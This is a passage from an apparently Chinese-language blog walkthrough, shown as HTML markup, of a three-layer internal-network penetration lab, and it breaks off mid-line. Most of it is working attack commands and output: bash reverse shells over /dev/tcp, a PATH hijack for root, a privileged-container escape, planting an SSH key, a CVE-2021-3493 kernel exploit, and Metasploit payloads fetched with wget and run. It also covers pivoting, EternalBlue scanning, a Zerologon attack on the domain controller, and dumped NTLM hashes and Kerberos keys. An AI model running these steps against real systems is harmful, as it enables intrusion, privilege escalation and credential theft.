/etc/nginx/conf.d/81.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">81</span>;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">location</span> <span class="title">/ &#123;</span></span><br><span class="line"><span class="title">       proxy_pass</span> http://<span class="number">192.168</span>.<span class="number">52.20</span>:<span class="number">8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220174049603.png" alt="image-20241220174049603"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">52.20</span>这台机器肯定是内网机器,如果我们通过webshell提权,容器逃逸,那么进而拿到内网设备的shell,就可以不用做代理了</span><br><span class="line">把webshell弹到<span class="title class_">DMZ</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># nc -lvp 1111</span></span><br><span class="line">system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.52.10/1111 0&gt;&amp;1&quot;&#x27;</span>);  这里<span class="title class_">DMZ</span>的ip必须是内网,就是<span class="number">52</span>段</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220174451576.png" alt="image-20241220174451576"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> </span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span></span><br><span class="line"><span class="built_in">cd</span> /home/jobs</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220174609828.png" alt="image-20241220174609828"></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功获得root权限，把shell再反弹到DMZ中</span><br><span class="line">bash <span class="punctuation">-</span>c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/<span class="number">1112</span> &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220174921806.png" alt="image-20241220174921806"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接下来容器逃逸,如果用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker <span class="built_in">run</span> —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l <span class="comment">#查看磁盘文件</span></span><br><span class="line"><span class="built_in">ls</span> /dev <span class="comment">#查看设备文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220180047291.png" alt="image-20241220180047291"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目前有三个磁盘文件和N个设备文件，我们将<span class="regexp">/dev/</span>sda1挂载到自己创建的文件夹</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220180204071.png" alt="image-20241220180204071"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hack文件夹下已经有物理机所有的文件了,并且我们还是root</span><br><span class="line"><span class="built_in">cat</span> etc/shadow 发现有ubuntu的密码,用john无果</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用DMZ生成ssh公钥写到内网设备,然后DMZ用ssh连接ubuntu</span><br><span class="line">在 DMZ生成公钥</span><br><span class="line">ssh-keygen -f hack</span><br><span class="line">chmod <span class="number">600</span> hack <span class="comment">#赋予权限</span></span><br><span class="line">在容器里</span><br><span class="line">cp -avx <span class="regexp">/hack/</span>home<span class="regexp">/ubuntu/</span>.ssh<span class="regexp">/id_rsa.pub /</span>hack<span class="regexp">/home/u</span>buntu<span class="regexp">/.ssh/</span>authorized_keys   <span class="comment">#-avx是将权限也一起复制</span></span><br><span class="line">echo &gt; <span class="regexp">/hack/</span>home<span class="regexp">/ubuntu/</span>.ssh/authorized_keys <span class="comment">#清空authorized_keys文件</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwLGNLwyQxbiggus8yI5HbFOT7hridX/EzzcmN7ES7OgJUnSgyZbOtzzrqAmXZYo69ISwoNnPf7hiT7HuYNp1cxLR4jmd3pPfwVw+59VFs73rwB917NWVi0h6CSLI2okQTZv0lDo9deRY5nXKzZt4gKbpjG2E2Us1/Xwy8h+bviG1kTeJXeDtj8psFvu6XXIWXMIuajBif72BCcoL3hJ44KwvBpgGUfj+oEX1mA+uUNXCLP+KKClV2RLWggopDo/3qluG21O6RzRPEKWw6QSjQhFT14oj08wVUa3LMLquXOUJJzJVj+qz8OdWlim/K5eY5k26aCTK4VF35wrp4b6T5 root@ubuntu&#x27;</span> &gt; <span class="regexp">/hack/</span>home<span class="regexp">/ubuntu/</span>.ssh/authorized_keys <span class="comment">#将ssh秘钥写入authorized_keys文件</span></span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/hack/</span>home<span class="regexp">/ubuntu/</span>.ssh/authorized_keys <span class="comment">#查看是否写入成功</span></span><br><span class="line">在DMZ区</span><br><span class="line">ssh -i hack ubuntu@<span class="number">192.168</span>.<span class="number">52.20</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220182416551.png" alt="image-20241220182416551"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220182507174.png" alt="image-20241220182507174"></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里发现它有两个段,那么这就是二层内网,里面还有三层内网<span class="number">-93</span>段</span><br><span class="line">提权,这里用内核<span class="comment">(一般走投无路了才用内核提权,有时候内网机器会直接蓝屏)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CVE<span class="string">-2021</span><span class="string">-3493</span></span><br><span class="line">linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。</span><br><span class="line">linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</span><br><span class="line"></span><br><span class="line">漏洞影响版本</span><br><span class="line"></span><br><span class="line">Ubuntu 20.10</span><br><span class="line">Ubuntu 20.04 LTS</span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line">Ubuntu 14.04 ESM</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/briskets/</span>CVE-<span class="number">2021</span>-<span class="number">3493</span><span class="regexp">/blob/m</span>ain/exploit.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim exploit.c <span class="comment">#将下载的exploit.c的内容粘贴到该文件中</span></span><br><span class="line">gcc exploit.c -o exploit <span class="comment">#编译</span></span><br><span class="line"><span class="built_in">chmod</span> +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220183312839.png" alt="image-20241220183312839"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这时候就拿到了二层设备<span class="built_in">的root</span>权限,继续打三层设备</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这时候把shell都转到msfconsole,第一步先传DMZ的shell</span><br><span class="line">msf6 post(linux/busybox/wget_exec) &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target Linux</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> SRVHOST 192.168.240.130</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST 192.168.240.130</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload /linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220220016485.png" alt="image-20241220220016485"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220220159081.png" alt="image-20241220220159081"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">添加路由</span><br><span class="line"></span><br><span class="line"><span class="built_in">run</span> get_local_subnets</span><br><span class="line"><span class="built_in">run</span> autoroute -s 192.168.52.0 -n 255.255.255.0</span><br><span class="line"><span class="built_in">run</span> autoroute -p</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">run</span> get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line">Local subnet: 192.168.52.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.240.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.240.2/0.0.0.0</span><br><span class="line">meterpreter &gt; <span class="built_in">run</span> autoroute -s 192.168.52.0 -n 255.255.255.0</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line">[*] Adding a<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0<span class="built_in">..</span>.</span><br><span class="line">[+] Added<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0 via 192.168.240.138</span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br><span class="line">meterpreter &gt; <span class="built_in">run</span> autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line"></span><br><span class="line">Active<span class="built_in"> Routing </span>Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220220350600.png" alt="image-20241220220350600"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">传web2的<span class="built_in">shell</span></span><br><span class="line">首先MSF生成木马，通过MSF上传到Web <span class="number">1</span>中</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">2111</span> -f elf -o <span class="built_in">shell</span>.elf</span><br><span class="line">sessions <span class="number">1</span></span><br><span class="line">upload <span class="built_in">shell</span>.elf /tmp/<span class="built_in">shell</span>.elf</span><br><span class="line"><span class="built_in">shell</span>一下进入<span class="built_in">shell</span></span><br><span class="line">python -m <span class="keyword">http</span>.server开启<span class="number">8000</span>端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 2111</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> rhost 192.168.52.20</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">然后在DMZ的那个获得二层主机shell的shell上运行</span><br><span class="line"></span><br><span class="line">bash-4.3# wget 192.168.52.10:8000/shell.elf</span><br><span class="line">--2024-12-20 06:10:02--  http://192.168.52.10:8000/shell.elf</span><br><span class="line">Connecting to 192.168.52.10:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 198 [application/octet-stream]</span><br><span class="line">Saving to: ‘shell.elf’</span><br><span class="line"></span><br><span class="line">100%[=======================================================================================================================================================================&gt;] 198         --.-K/s   <span class="keyword">in</span> 0s</span><br><span class="line"></span><br><span class="line">2024-12-20 06:10:02 (88.7 MB/s) - ‘shell.elf’ saved [198/198]</span><br><span class="line"></span><br><span class="line">bash-4.3# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),24(cdrom),27(<span class="built_in">sudo</span>),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(ubuntu)</span><br><span class="line">bash-4.3# <span class="built_in">chmod</span> +x shell.elf</span><br><span class="line">bash-4.3# ./shell.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个时候就把二层的shell也传到msf上了,其中接二层shell的msf我又起了一个,也可以都用一个</span><br><span class="line">扫描52段和93段</span><br><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf6 auxiliary(scanner/discovery/udp_sweep) &gt; <span class="built_in">set</span> RHOSTS 192.168.52.0-255</span><br><span class="line">msf6 auxiliary(scanner/discovery/udp_sweep) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220222749412.png" alt="image-20241220222749412"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220222908810.png" alt="image-20241220222908810"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扫描结束 52段就这一台机器,93段还有2台机器.其中93.30这台机器是DC机</span><br><span class="line">批量扫描一下内网主机有没有永恒之蓝漏洞</span><br><span class="line">msf6 auxiliary(scanner/discovery/udp_sweep) &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> rhosts 192.168.93.0-255</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> threads 512</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220224427019.png" alt="image-20241220224427019"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这两台机器有漏洞,用方程式漏洞工具打,因为不出网,内网机器肯定找不到我kali</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用msf开个socks代理,电脑打开proxifier</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220225823385.png" alt="image-20241220225823385"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220225953207.png" alt="image-20241220225953207"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尝试了好多次都失败</span><br><span class="line">用msf生成dll文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=445 -f dll &gt; msf.dll</span><br><span class="line">将msf.dll放到工具目录替换原来的，MSF设置好监听</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.93.40</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 3111</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">依然不行,死活拿不下三层机器的<span class="keyword">shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">但是人生往往是山重水复疑无路,柳暗花明又一村</span></span><br><span class="line">跳过我们已经认定的从ms17提权的思维,尝试一下,也许会有不一样的结果</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CVE-<span class="number">2020</span>-<span class="number">1472</span></span><br><span class="line">简介</span><br><span class="line">攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序</span><br><span class="line"></span><br><span class="line">检测是否有MS-NRPC漏洞</span><br><span class="line"><span class="keyword">vim</span> /etc/proxychains4.<span class="keyword">conf</span> #设置代理socks <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">1080</span></span><br><span class="line">proxychains4 <span class="keyword">python3</span> zerologon_tester.<span class="keyword">py</span> DC <span class="number">192.168</span>.<span class="number">93.30</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221013703064.png" alt="image-20241221013703064"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这就是有,接下来将域控密码置空</span><br><span class="line">proxychains4 python3 cve-<span class="number">2020-1472</span>-exploit.py -t <span class="number">192.168.93.30</span> -n DC</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221014001698.png" alt="image-20241221014001698"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用impacket中的工具将域控的密码dump下来</span><br><span class="line">proxychains4 <span class="keyword">python3</span> secretsdump.<span class="keyword">py</span> WHOAMIANONY.ORG/DC\$@<span class="number">192.168</span>.<span class="number">93.30</span> -just-dc -<span class="keyword">no</span>-pass</span><br></pre></td></tr></table></figure>
+
+<p>​	</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Administrator:</span><span class="number">500</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:ab89b1295e69d353dd7614c7a3a80cec</span>:::</span><br><span class="line"><span class="symbol">Guest:</span><span class="number">501</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="symbol">krbtgt:</span><span class="number">502</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:</span><span class="number">6</span>be58bfcc0a164af2408d1d3bd313c2a:::</span><br><span class="line"><span class="symbol">whoami:</span><span class="number">1001</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:ab89b1295e69d353dd7614c7a3a80cec</span>:::</span><br><span class="line">whoamianony.org\<span class="symbol">bunny:</span><span class="number">1112</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:cc567d5556030b7356ee4915ff098c8f</span>:::</span><br><span class="line">whoamianony.org\<span class="symbol">moretz:</span><span class="number">1115</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:ba6723567ac2ca8993b098224ac27d90</span>:::</span><br><span class="line"><span class="title class_">DC</span><span class="variable">$:</span><span class="number">1002</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="title class_">PC2</span><span class="variable">$:</span><span class="number">1113</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:</span><span class="number">66</span>da77301595ac91cf53d07016ca7017:::</span><br><span class="line">[*] <span class="title class_">Kerberos</span> keys grabbed</span><br><span class="line"><span class="symbol">krbtgt:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">77</span>dd8d0b0d436b6df02303f0a5a98d95acda6f84144ea53525bfee5ffda45afb</span><br><span class="line"><span class="symbol">krbtgt:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:aaeee8cffc1ade3061ce78b89237a7b8</span></span><br><span class="line"><span class="symbol">krbtgt:</span>des-cbc-<span class="symbol">md5:</span><span class="number">9</span>b3446f829dfbf3e</span><br><span class="line">whoamianony.org\<span class="symbol">bunny:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">62694713</span>f45b34ebcd0dd2ad5a66ebb20a7245e839b5a2a149d2ab367a703120</span><br><span class="line">whoamianony.org\<span class="symbol">bunny:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">63064306</span>d5306e43c7c56c7d7ac44d57</span><br><span class="line">whoamianony.org\<span class="symbol">bunny:</span>des-cbc-<span class="symbol">md5:</span><span class="number">8</span>fd6bc2980d5523b</span><br><span class="line">whoamianony.org\<span class="symbol">moretz:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">854</span>ae083f158747bf98a27b4f32bccfe369c8e3d04c5eb12b14c0e25117dc2cf</span><br><span 